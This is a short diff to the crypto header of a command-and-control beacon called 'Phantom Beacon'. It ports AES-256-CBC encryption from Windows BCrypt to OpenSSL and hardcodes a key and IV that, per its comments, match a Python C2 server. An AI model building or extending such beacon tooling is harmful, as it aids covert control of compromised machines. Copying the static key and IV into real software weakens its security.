@@ -1,9 +1,9 @@
 #pragma once
 // ============================================================================
-//  crypto.h — Phantom Beacon Cryptographic Layer
-//  ──────────────────────────────────────────────
-//  AES-256-CBC encryption/decryption using Windows Native CNG (BCrypt).
-//  Zero external dependencies — uses only bcrypt.dll which ships with Windows.
+//  crypto.h — Phantom Beacon Cryptographic Layer (Cross-Platform)
+//  ──────────────────────────────────────────────────────────────────────
+//  AES-256-CBC encryption/decryption.
+//  Windows: BCrypt native. POSIX: OpenSSL.
 // ============================================================================
 
 #ifdef _WIN32
@@ -16,10 +16,12 @@
     #ifndef NT_SUCCESS
     #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
     #endif
+    typedef unsigned long ULONG;
 #else
     #include <openssl/evp.h>
     #include <openssl/err.h>
     typedef unsigned char BYTE;
+    typedef unsigned int ULONG;
 #endif
 #include <vector>
 #include <string>
@@ -32,7 +34,7 @@ namespace crypto {
 // Must match the Python C2 server's AES_KEY and AES_IV exactly.
 // In production these would be negotiated per-session or embedded at compile time.
 static const BYTE AES_KEY[] = "PhantomC2_SecretKey_32bytes_Long";  // 32 bytes
-static const BYTE AES_IV[]  = "PhantomC2_IV16b";                   // 16 bytes (block size)
+static const BYTE AES_IV[]  = "PhantomC2_IV16b\x00";               // 16 bytes (block size)
 
 constexpr ULONG KEY_LEN   = 32;
 constexpr ULONG BLOCK_LEN = 16;
